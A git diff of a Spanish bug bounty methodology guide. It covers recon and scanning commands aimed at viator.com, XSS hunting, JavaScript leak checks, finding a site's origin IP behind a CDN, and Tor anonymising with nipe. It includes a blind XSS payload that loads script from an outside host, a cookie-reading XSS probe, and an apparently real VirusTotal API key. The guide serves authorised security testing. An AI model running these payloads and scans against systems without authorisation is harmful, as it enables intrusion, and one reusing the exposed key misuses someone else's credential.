@@ -3,100 +3,72 @@
 `Bug Bounty Methodology` este documento sirve para tener una metodología a la hora de hacer bug bounty en programas BBP (bug bounty program) o VDP (vulnerability disclosure program). Donde encontraras comandos para ayudarte rapidamente a realizar bug bounty desde lo mas básico a lo avanzado.
 
 ### 1.1. Encontrar todos subdominios con subfinder de un dominio principal
-
-```bash
-subfinder -d viator.com -all  -recursive > subdomain.txt
-```
-
+   - ```bash 
+      subfinder -d viator.com -all  -recursive > subdomain.txt
+      ```
 ### 1.2. Usando httpx-toolkit para filtrar subdominio con código HTTP 200 y puertos 80,443,8080,8000,8888
-
-```bash
-cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
-```
-
+   - ```bash 
+      cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
+      ```
 ### 1.3. Usando katana para el reconocimiento pasivo y excluye los recursos estáticos con las extensiones especificadas woff,css,png....
-
-```bash
-katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
-```
-
+   - ```bash 
+      katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
+      ```
 ### 1.4. Filtrar por extensiones
-
-```bash
-cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
-```
-
+   - ```bash 
+      cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
+      ```
 ### 1.5. Filtrar extensiones javascript
-
-```bash
-cat allurls.txt | grep -E "\.js$" >> js.txt
-```
-
+   - ```bash 
+      cat allurls.txt | grep -E "\.js$" >> js.txt
+      ```
 ### 1.6. Usando nuclei para ver encontrar Information disclosure
-
-```bash
-cat js.txt | nuclei -t /home/sn0w/nuclei-templates/http/exposures/ 
-```
-
+   - ```bash 
+      cat js.txt | nuclei -t /home/sn0w/nuclei-templates/http/exposures/ 
+      ```
 ### 1.7. Usando nuclei para ver encontrar Information disclosure en un sitio web
-
-```bash
-echo www.viator.com | katana -ps | grep -E "\.js$" | nuclei -t /home/sn0w/nuclei-templates/http/exposures/ -c 30
-```
-
+   - ```bash 
+      echo www.viator.com | katana -ps | grep -E "\.js$" | nuclei -t /home/sn0w/nuclei-templates/http/exposures/ -c 30
+      ```
 ### 1.8. Buscar con dirsearch directorios ocultos vulnerables
-
-```bash
-dirsearch  -u https://www.viator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json
-```
-```bash
-dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1
-```
-
+   - ```bash 
+      dirsearch  -u https://www.viator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json
+      ```
+   - ```bash 
+      dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1
+      ```
 ### 1.9. Buscar con subfinder, httpx, katana, gf, bxss en el sitio web vulnerabilidades xss
-
-```bash
-subfinder -d viator.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters
-```
-
+   - ```bash 
+      subfinder -d viator.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters
+      ```
 ### 1.10. Ver certificados SSL vulnerable
-
-```bash
-subzy run --targets subdomains_alive.txt --verify_ssl
-```
-```bash
-subzy run --targets subdomains_alive.txt --concurrency 100 --hide_fails --verify_ssl
-```
-
+   - ```bash 
+      subzy run --targets subdomains_alive.txt --verify_ssl
+      ```
+   - ```bash 
+      subzy run --targets subdomains_alive.txt --concurrency 100 --hide_fails --verify_ssl
+      ```     
 ### 1.11. CORS
-
-```bash
-python3 corsy.py -i /home/sn0w/vaitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
-
-```
+   - ```bash 
+      python3 corsy.py -i /home/sn0w/vaitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
+      ```
 ### 1.12. CORS con Nuclei
-
-```bash
-nuclei -list subdomains_alive.txt -t /home/sn0w/Priv8-Nuclei/cors
-```
-
+   - ```bash 
+      nuclei -list subdomains_alive.txt -t /home/sn0w/Priv8-Nuclei/cors
+      ```
 ### 1.13. Nuclei
-
-```bash
-nuclei  -list ~/vaitor/subdomains_alive.txt -tags cve,osint,tech
-```
-
+   - ```bash 
+      nuclei  -list ~/vaitor/subdomains_alive.txt -tags cve,osint,tech
+      ```
 ### 1.14. LFI
-
-```bash
-cat allurls.txt | gf lfi | nuclei -tags lfi
-```
-
+   - ```bash 
+      cat allurls.txt | gf lfi | nuclei -tags lfi
+      ```
 ### 1.15. OR Open Redirect
+   - ```bash 
+      cat allurls.txt | gf redirect | openredirex -p /home/sn0w/openRedirect
+      ```
 
-```bash
-cat allurls.txt | gf redirect | openredirex -p /home/sn0w/openRedirect
-```
 
 
 -------------------------------------------------------------------------------------------------
@@ -105,84 +77,75 @@ cat allurls.txt | gf redirect | openredirex -p /home/sn0w/openRedirect
 # ***II. XSS: Methodology***
 
 `XSS Methodology` herramientas utilizadas.
-- https://github.com/lc/gau
-- https://github.com/tomnomnom/gf
-- https://github.com/coffinxp/gFpattren
-- https://github.com/s0md3v/uro
-- https://github.com/KathanP19/Gxss
-- https://github.com/Emoe/kxss
-- https://github.com/coffinxp/loxs
-
+- https://github.com/lc/gau   |   https://github.com/tomnomnom/gf   |   https://github.com/coffinxp/gFpattren   |   https://github.com/s0md3v/uro   |   https://github.com/KathanP19/Gxss   |   https://github.com/Emoe/kxss   |   https://github.com/coffinxp/loxs
 
 ### 2.1. Encontrar un campo de entrada como un buscar en una web, primero copiar un texto y si sale not found, con control + U vemos en el código fuente si el texto se guarda en el value.
-```bash
-paulportanc"><img src/onerror=prompt(document.cookie)>
-```
-
+   - ```bash 
+      snow"><img src/onerror=prompt(document.cookie)>
+      ```
 ### 2.2. Automatizando.
-- Buscamos mas campos que sean vulnerables a XSS
-```bash
-echo https://www.ejemplo.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
-```
-- De los campos encontrados extraemos hasta donde inicia la busqueda para pasarlo por la herramienta de loxs
-```bash
-cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=' | sort -u > final.txt
+   - Buscamos mas campos que sean vulnerables a XSS
+     ```bash 
+      echo https://www.ejemplo.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
+     ```
+   - De los campos encontrados extraemos hasta donde inicia la busqueda para pasarlo por la herramienta de loxs
+     ```bash 
+      cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=' | sort -u > final.txt
+      cat final.txt
+      https://www.ejemplo.com/analog-watches?page=
+      https://www.ejemplo.com/boxers?page=
+      https://www.ejemplo.com/search?seach_key=
+      https://www.ejemplo.com/home-storage-supplies?page=
+      https://www.ejemplo.com/wall-clock?page=
+      ....       
+     ```     
+   - Mover el archivo final.txt al directorio donde esta la herramienta loxs https://github.com/coffinxp/loxs
+     ```bash 
+      mv final.txt loxs
+      cd loxs
+      python loxs.py
+     ```     
+   - Elegir la opción 4 de la herramienta XSS Scanner. En la primera pregunta escribimos final.txt que buscara nuestro archivo que hemos movido al directorio de la herramienta. Y en la segunda pregunta escogemos e payload xss.txt, finalmente en el tiempo por cada solicitud damos enter.
+     ```bash 
+      [?] enter the pat to the input file containing URLs (or press enter to enter a single UR): final.txt
+      [?] Enter the path to the payloads file: payloads/xss.txt
+      Enter the timeout duration for each request (Press Enter for 0.5): "Presionar enter"
+     ```
 
-cat final.txt
-https://www.ejemplo.com/analog-watches?page=
-https://www.ejemplo.com/boxers?page=
-https://www.ejemplo.com/search?seach_key=
-https://www.ejemplo.com/home-storage-supplies?page=
-https://www.ejemplo.com/wall-clock?page=
-....
-```
-- Mover el archivo final.txt al directorio donde esta la herramienta loxs https://github.com/coffinxp/loxs
-```bash
-mv final.txt loxs
-cd loxs
-python loxs.py
-```
-- Elegir la opción 4 de la herramienta XSS Scanner. En la primera pregunta escribimos final.txt que buscara nuestro archivo que hemos movido al directorio de la herramienta. Y en la segunda pregunta escogemos e payload xss.txt, finalmente en el tiempo por cada solicitud damos enter.
-```bash
-[?] enter the pat to the input file containing URLs (or press enter to enter a single UR): final.txt
-[?] Enter the path to the payloads file: payloads/xss.txt
-Enter the timeout duration for each request (Press Enter for 0.5): "Presionar enter"
-```
-
+     
 -------------------------------------------------------------------------------------------------
 
 
 # ***III. JavaScript Reconocimiento: Methodology***
 
 ### 3.1. Extraer todos los endpoint js.
-```bash
-katana -u ejemplo.com -d 5 -jc | grep '\.js$' | tee alljs.txt
-```
+   - ```bash 
+      katana -u ejemplo.com -d 5 -jc | grep '\.js$' | tee alljs.txt
+      ```
 ### 3.2. Obtener todas las URLs conocidas relacionadas con el dominio desde varias fuentes públicas y agregamos las nuevas URLs al archivo alljs.txt.
-```bash
-echo ejemplo.com | gau | grep '\.js$' | anew alljs.txt
-```
+   - ```bash 
+      echo ejemplo.com | gau | grep '\.js$' | anew alljs.txt
+      ```
 ### 3.3. Comprobar las URLs listadas, seleccionando solo las que devuelven un código HTTP 200 (OK).
-```bash
-cat alljs.txt | uro | sort -u | httpx-toolkit -mc 200 -o ejemplo.txt
-```
+   - ```bash 
+      cat alljs.txt | uro | sort -u | httpx-toolkit -mc 200 -o ejemplo.txt
+      ```
 ### 3.4. Analizar los archivos JavaScript en busca de fugas de información.
-```bash
-cat ejemplo.txt | jsleaks -s -l -katana
-```
+   - ```bash 
+      cat ejemplo.txt | jsleaks -s -l -katana
+      ```
 ### 3.5. Escaneo de vulnerabilidades usando la plantilla especificada para buscar divulgación de credenciales. -c 30: Corre 30 hilos en paralelo para mayor velocidad
-```bash
-cat ejemplo.txt | nuclei -t prsnl/credentials-disclosure-all.yaml -c 30
-```
+   - ```bash 
+      cat ejemplo.txt | nuclei -t prsnl/credentials-disclosure-all.yaml -c 30
+      ```
 ### 3.6. Similar al comando anterior, pero utiliza una plantilla diferente (http/exposures) para buscar exposiciones de datos.
-```bash
-cat ejemplo.txt | nuclei -t /home/paulportanc/nuclei-template/http/exposures -c 30
-```
+   - ```bash 
+      cat ejemplo.txt | nuclei -t /home/paulportanc/nuclei-template/http/exposures -c 30
+      ```
 ### 3.7. Final.
-```bash
-cat ejemplo.txt | xargs -I{} bash -c 'echo -e "\ntarget: {}\n' && python lazyegg.py "{}" --js_urls --domains --ips --leaked_creds --local_storage'
-```
-
+   - ```bash 
+      cat ejemplo.txt | xargs -I{} bash -c 'echo -e "\ntarget: {}\n' && python lazyegg.py "{}" --js_urls --domains --ips --leaked_creds --local_storage'
+      ```
 
 -------------------------------------------------------------------------------------------------
 
@@ -228,50 +191,52 @@ cat ejemplo.txt | xargs -I{} bash -c 'echo -e "\ntarget: {}\n' && python lazyegg
    ```bash
    shodan search Ssl.cert.subject.CN:"ejemplo.com" 200 --fields ip_str | httpx-toolkit -sc -title -server -td
    ```
-6. Si aún no hemos encontrado la IP origen podemos seguir probando otro metodo, en el sitio web https://favicons.teamtailor-cdn.com/#result copiamos el sitio web https://ejemplo.com/
-7. Puedes ver que tenemos la URL de favicon de este dominio. Ahora podemos generar su hash usando otro sitio web https://favicon-hash.kmsec.uk. Copiamos solo el dominio del favicon https://ejemplo.com/favicon.ico en Retrieve from URL y generamos su hash md5.
-8. Ahora abramos este hash en shodan, puede que aparezcan resultado como tambien no aparecieron resultados para este hash.
-9. Verificar el hash generado en Censys. La misma pagina de https://favicon-hash.kmsec.uk te da la opcion de buscar en Shodan, VirusTotal y Censys. Puede que obtengas resultados, acceder a esas IP una por una.
-10. Comprobar el historial de IP del sitio web usando un sitio web de información de DNS https://viewdns.info y en la parte que dice IP History copiar el nombre del dominio ejemplo.com. Verá una lista de IP históricas. Puede probar estas IP una por una.
-11. Otro sitio web para probar es verificar el registro SPF de un dominio, simplemente copie el dominio ejemplo.com en https://mxtoolbox.com/SuperTool.aspx?action=dmarc%adrop.com&run=toolpage#. En el boton viene por defecto DMARC Lookup cambiar o seleccionar por SPF Record Lookup.
-12. De manera similar, ahora pasemos al siguiente sitio web, SecurityTrails, que uso para verificar los registros de IP https://securitytrails.com/app/account y pegamos el dominio para buscar ejemplo.com y haga clic en Historical Data. Puedes ver que hay tantos registros de IP de este sitio web, puedes copiar estas IP y comprobar si se puede acceder directamente a ellas o no.
-13. En Censys https://search.censys.io ingresamos el dominio ejemplo.com y buscamos. Verás muchos resultados tanto con ipv4 como con ipv6.
-14. También podemos utilizar FOFA https://en.fofa.info, otra excelente herramienta para encontrar IP. Solo copiamos el nombre del dominio "ejemplo.com". Podemos filtrarlo con el favicon del sitio para obtener resultado de ese sitio web.
-15. Ahora pasemos a ZoomEye https://www.zoomeye.hk/v2/, que es otra gran alternativa para mostrar IPs, solo copiar el dominio "ejemplo.com" y hacer clic en buscar.
-16. Otro método efectivo implica el uso de virus total, una excelente herramienta para descubrir subdominios y direcciones IP asociadas. Para comenzar, simplemente pegue el dominio en el parámetro de dominio y presione Entrar:
+7. Si aún no hemos encontrado la IP origen podemos seguir probando otro metodo, en el sitio web https://favicons.teamtailor-cdn.com/#result copiamos el sitio web https://ejemplo.com/
+8. Puedes ver que tenemos la URL de favicon de este dominio. Ahora podemos generar su hash usando otro sitio web https://favicon-hash.kmsec.uk. Copiamos solo el dominio del favicon https://ejemplo.com/favicon.ico en Retrieve from URL y generamos su hash md5.
+9. Ahora abramos este hash en shodan, puede que aparezcan resultado como tambien no aparecieron resultados para este hash.
+10. Verificar el hash generado en Censys. La misma pagina de https://favicon-hash.kmsec.uk te da la opcion de buscar en Shodan, VirusTotal y Censys. Puede que obtengas resultados, acceder a esas IP una por una.
+11. Comprobar el historial de IP del sitio web usando un sitio web de información de DNS https://viewdns.info y en la parte que dice IP History copiar el nombre del dominio ejemplo.com. Verá una lista de IP históricas. Puede probar estas IP una por una.
+12. Otro sitio web para probar es verificar el registro SPF de un dominio, simplemente copie el dominio ejemplo.com en https://mxtoolbox.com/SuperTool.aspx?action=dmarc%adrop.com&run=toolpage#. En el boton viene por defecto DMARC Lookup cambiar o seleccionar por SPF Record Lookup.
+13. De manera similar, ahora pasemos al siguiente sitio web, SecurityTrails, que uso para verificar los registros de IP https://securitytrails.com/app/account y pegamos el dominio para buscar ejemplo.com y haga clic en Historical Data. Puedes ver que hay tantos registros de IP de este sitio web, puedes copiar estas IP y comprobar si se puede acceder directamente a ellas o no.
+14. En Censys https://search.censys.io ingresamos el dominio ejemplo.com y buscamos. Verás muchos resultados tanto con ipv4 como con ipv6.
+15. También podemos utilizar FOFA https://en.fofa.info, otra excelente herramienta para encontrar IP. Solo copiamos el nombre del dominio "ejemplo.com". Podemos filtrarlo con el favicon del sitio para obtener resultado de ese sitio web.
+16. Ahora pasemos a ZoomEye https://www.zoomeye.hk/v2/, que es otra gran alternativa para mostrar IPs, solo copiar el dominio "ejemplo.com" y hacer clic en buscar.
+5. Otro método efectivo implica el uso de virus total, una excelente herramienta para descubrir subdominios y direcciones IP asociadas. Para comenzar, simplemente pegue el dominio en el parámetro de dominio y presione Entrar
+   ```bash
+   Ssl.cert.subject.CN:"ejemplo.com" 200
+   ```
    ```bash
    https://www.virustotal.com/vtapi/v2/domain/report?apikey=3c8812a869db20881601fc05d21a3ac8baca9a3f243357af29923c739c93a62f&domain=dell.com
    ```
    - Cambiar dell.com por el sitioweb ejemplo.com.
-   - Como notará, virustotal proporciona una gran cantidad de información, incluidas muchas direcciones IP que el sitio web resuelve; sin embargo, verificar manualmente todas estas IP puede ser un desafío. Para facilitar este proceso, con este comando simple de una sola línea que recupera todas las direcciones IP usando una terminal, solo necesita copiar el comando y pegarlo en la terminal. Al instante verá una lista de direcciones IP obtenidas del sitio web. 
-   ```bash
-   curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=ejemplo.com&apikey=3c8812a869db20881601fc05d21a3ac8baca9a3f243357af29923c739c93a62f" | jq -r '.. | .ip_address? // empty' | grep -Eo'([0-9]{1,3}\.){3}[0-9]{1,3}'
-   ```
-   - Estoy usando httpx para este script, lo que hace que sea conveniente verificar qué IP son válidas y accesibles. 
-   ```bash
-   curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=ejemplo.com&apikey=3c8812a869db20881601fc05d21a3ac8baca9a3f243357af29923c739c93a62f" | jq -r '.. | .ip_address? // empty' | grep -Eo'([0-9]{1,3}\.){3}[0-9]{1,3}' | httpx-toolkit -sc -td -title -server
-   ```
-   - También puedes usar otro mismo trazador de líneas para buscar subdominios. 
+   - Como notará, virustotal proporciona una gran cantidad de información, incluidas muchas direcciones IP que el sitio web resuelve; sin embargo, verificar manualmente todas estas IP puede ser un desafío. Para facilitar este proceso, con este comando simple de una sola línea que recupera todas las direcciones IP usando una terminal, solo necesita copiar el comando y pegarlo en la terminal. Al instante verá una lista de direcciones IP obtenidas del sitio web.
+      ```bash
+      curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=ejemplo.com&apikey=3c8812a869db20881601fc05d21a3ac8baca9a3f243357af29923c739c93a62f" | jq -r '.. | .ip_address? // empty' | grep -Eo'([0-9]{1,3}\.){3}[0-9]{1,3}'
+      ```
+   - Estoy usando httpx para este script, lo que hace que sea conveniente verificar qué IP son válidas y accesibles.
+      ```bash
+      curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=ejemplo.com&apikey=3c8812a869db20881601fc05d21a3ac8baca9a3f243357af29923c739c93a62f" | jq -r '.. | .ip_address? // empty' | grep -Eo'([0-9]{1,3}\.){3}[0-9]{1,3}' | httpx-toolkit -sc -td -title -server
+      ```
+   - También puedes usar otro mismo trazador de líneas para buscar subdominios.
       ```bash
       curl -s "https://www.virustotal.com/vtapi/v2/domain/report?apikey=3c8812a869db20881601fc05d21a3ac8baca9a3f243357af29923c739c93a62f&domain=ejemplo.com" | jq -r '.domain_siblings[]'
-     ```
+      ```      
 18. Ahora pase al siguiente método. Utilizo AlienVault para esto. También es bueno para encontrar el sitio web IP de origen. Simplemente cambie el dominio y presione enter: 
      ```bash
       https://otx.alienvault.com/api/v1/indicators/hostname/ejemplo.com/url_list?limit=500&page=1
     ```
-  - Tambien puede utilizar este oneliner. Opcional puede agregar httpx-toolkit para verificar qué IP son válidas y accesibles. 
-   ```bash
-   curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/ejemplo.com/url_list?limit=500&page=1" | jq -r '.url_list[]?.result?.urlworker?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | httpx-toolkit -sc- td -title
-   ```
+    - Tambien puede utilizar este oneliner. Opcional puede agregar httpx-toolkit para verificar qué IP son válidas y accesibles.
+      ```bash
+      curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/ejemplo.com/url_list?limit=500&page=1" | jq -r '.url_list[]?.result?.urlworker?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | httpx-toolkit -sc- td -title
+      ```
 19. Ahora, por último, pero no menos importante, también puedes probar el escaneo con urlscan para encontrar la IP de origen, simplemente cambia el dominio e ingresa.
      ```bash
       https://urlscan.io/api/v1/search/?q=domain:ejemplo.com&size=10000
     ```
-     - Tambien puede utilizar este oneliner. Opcional puede agregar httpx-toolkit para verificar qué IP son válidas y accesibles. 
+    - Tambien puede utilizar este oneliner. Opcional puede agregar httpx-toolkit para verificar qué IP son válidas y accesibles.
       ```bash
       curl -s "https://urlscan.io/api/v1/search/?q=domain:ejemplo.com&size=10000" | jq -r '.result[]?.page?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | httpx-toolkit -sc- td -title -server
       ```
-
 
 ### Paso 2: IP Origen encontrada.
 
@@ -330,55 +295,50 @@ cat ejemplo.txt | xargs -I{} bash -c 'echo -e "\ntarget: {}\n' && python lazyegg
    `NIPE` es un programa que usa la red Tor como puerta de enlace predeterminada del usuario, enrutando todo el tráfico en la red Tor, que a menudo se usa para brindar privacidad y anonimato. Permanecer en el anonimato es una excelente manera de protegerse de todo tipo de vigilancia..
    
 ## 6.1.Instalación
-
    - Paso 1: Colocarse en el /home/kali y crear el directorio nipe e ingresar.
-   ```bash
-   mkdir nipe
-   cd nipe
-   ```
+     ```bash
+     mkdir nipe
+      cd nipe
+     ```
    - Paso 2: Luego, clonar este repositorio desde GitHub.
-   ```bash
-   git clone https://github.com/htrgouvea/nipe
-   ```
+     ```bash
+     git clone https://github.com/htrgouvea/nipe
+     ```     
    - Paso 3: Dentro habrá otro directorio llamado nipe, ingresar a el.
-   ```bash
-   cd nipe
-   ```    
+     ```bash
+     cd nipe
+     ```  
    - Paso 4: Ejecutar el siguiente comando para instalar las bibliotecas y dependencias.
-   ```bash
-   sudo cpan install Try::Tiny Config::Simple JSON
-   ```  
+     ```bash
+     sudo cpan install Try::Tiny Config::Simple JSON
+     ```  
    - Paso 5: Usar el siguiente comando para instalar las dependencias de Nipe o un script de Perl.
-   ```bash
-   sudo perl nipe.pl install
-   ```  
-
+     ```bash
+     sudo perl nipe.pl install
+     ```  
+    
 ## 6.2.Uso (ejecutar desde /home/kali/nipe/nipe)
+   - Paso 1: Verificar el estado de nipe, escriba el siguiente comando. Y verás que el estado actual es deshabilitado. Aparecerá de la siguiente manera: El estado está deshabilitado y la IP es su IP Pública actual. La IP se puede validar ingreando al sitio https://www.whatismyip.com/.
+     ```bash
+     sudo perl nipe.pl status
 
-   - Paso 1: Verificar el estado de nipe, escriba el siguiente comando. Y verás que el estado actual es deshabilitado. Aparecerá de la siguiente manera: El estado está deshabilitado y la IP es su IP Pública actual. La IP se puede validar ingreando al sitio https://www.whatismyip.com/
-   ```bash
-   sudo perl nipe.pl status
-
-   ┌──(kali㉿kali)-[~/nipe/nipe]
-   └─$ sudo perl nipe.pl status
+      ┌──(kali㉿kali)-[~/nipe/nipe]
+      └─$ sudo perl nipe.pl status
 
        [+] Status: false 
        [+] Ip: 38.25.30.53
-   ```
-  - Paso 2: Para iniciar el servicio Nipe. Luego ejecutar el comando status. El estado está en TRUE y la IP es una IP Pública de otro pais. 
-   ```bash
-   sudo perl nipe.pl start
+     ```
+   - Paso 2: Para iniciar el servicio Nipe. Luego ejecutar el comando status. El estado está en TRUE y la IP es una IP Pública de otro pais.
+     ```bash
+      sudo perl nipe.pl start
 
-   ┌──(kali㉿kali)-[~/nipe/nipe]
-   └─$ sudo perl nipe.pl status
+      ┌──(kali㉿kali)-[~/nipe/nipe]
+      └─$ sudo perl nipe.pl status
         
        [+] Status: true 
        [+] Ip: 185.220.102.8
-   ```
-   - **Nota** es probable que a la primera te aparezca el siguiente error: *[!] ERROR: sorry, it was not possible to establish a connection to the server.*  Si en caso de aparecer el siguiente error solo debes detener el estado con stop y luego volver a iniciar un par de veces hasta que en estado sea TRUE.
-
-
-
+     ```     
+   - **Nota** es probable que a la primera te aparezca el siguiente error: *[!] ERROR: sorry, it was not possible to establish a connection to the server.*  Si en caso de aparecer el siguiente error solo debes detener el estado con stop y luego volver a iniciar un par de veces hasta que en estado sea TRUE.     
 
 > [!Warning]
 > 
